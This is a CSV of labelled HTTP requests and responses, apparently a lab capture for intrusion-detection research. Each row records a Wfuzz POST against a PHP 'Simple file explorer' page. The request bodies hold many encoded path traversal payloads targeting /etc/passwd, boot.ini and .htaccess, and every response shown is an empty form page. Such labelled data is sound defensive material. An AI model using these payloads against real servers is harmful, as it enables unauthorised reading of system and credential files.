attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port,res_header_Connection,req_header_Connection
lfi,192.168.60.165,80,filename=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\/etc/passwd,*/*,286.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40310,close,
lfi,192.168.60.165,80,filename=.../.../.../.../...//etc/passwd,*/*,40.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40322,close,
lfi,192.168.60.165,80,filename=..0x5c..0x5c..0x5c..0x5c..0x5c/etc/passwd,*/*,50.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40330,close,
lfi,192.168.60.165,80,filename=./\/.//etc/passwd,*/*,26.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40340,close,
lfi,192.168.60.165,80,filename=%252e%252e%252fboot.ini,*/*,32.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40352,close,
lfi,192.168.60.165,80,filename=%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/boot.ini,*/*,62.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40368,close,
lfi,192.168.60.165,80,filename=..%255cboot.ini%00index.html,*/*,37.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40376,close,
lfi,192.168.60.165,80,filename=%2e%2e/%2e%2e/boot.ini;index.html,*/*,42.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40392,close,
lfi,192.168.60.165,80,filename=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\boot.ini,*/*,286.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40398,close,
lfi,192.168.60.165,80,filename=0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini,*/*,44.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40414,close,
lfi,192.168.60.165,80,filename=.\/\.\.\/\.\boot.ini,*/*,29.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40430,close,
lfi,192.168.60.165,80,filename=%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini,*/*,45.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40432,close,
lfi,192.168.60.165,80,filename=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afboot.ini,*/*,125.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40444,close,
lfi,192.168.60.165,80,filename=%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\boot.ini,*/*,164.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40458,close,
lfi,192.168.60.165,80,filename=../boot.ini%00index.html,*/*,33.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40470,close,
lfi,192.168.60.165,80,filename=0x2e0x2e0x2fboot.ini,*/*,29.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:49 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40482,close,
lfi,192.168.60.165,80,filename=%uff0e%uff0e%u2216%uff0e%uff0e%u2216boot.ini,*/*,53.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:49 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40494,close,
lfi,192.168.60.165,80,filename=.\/\.\.\/\.\.\/\.\.\/\.\boot.ini,*/*,41.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:49 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40510,close,
lfi,192.168.60.165,80,filename=.//..//.//..//.//..//boot.ini,*/*,38.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:49 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40514,close,
lfi,192.168.60.165,80,filename=%2e%68%74%61%63%63%65%73%73,*/*,36.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:49 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40530,close,
lfi,192.168.60.165,80,filename=..\..\..\..\..\..\..\..\..\..\boot.ini,*/*,47.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:49 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40534,close,
lfi,192.168.60.165,80,filename=%2e%2e\boot.ini,*/*,24.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:49 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40548,close,
lfi,192.168.60.165,80,filename=\../\../\../\../\../\../\../boot.ini,*/*,45.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:49 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40554,close,
lfi,192.168.60.165,80,filename=.../.../.../.../.../boot.ini,*/*,37.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:49 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40564,close,
lfi,192.168.60.165,80,filename=........................................................................../../../../../../../boot.ini,*/*,110.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:49 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40576,close,
lfi,192.168.60.165,80,filename=0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini,*/*,62.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:49 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40586,close,
lfi,192.168.60.165,80,filename=%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini,*/*,121.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:49 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,40592,close,
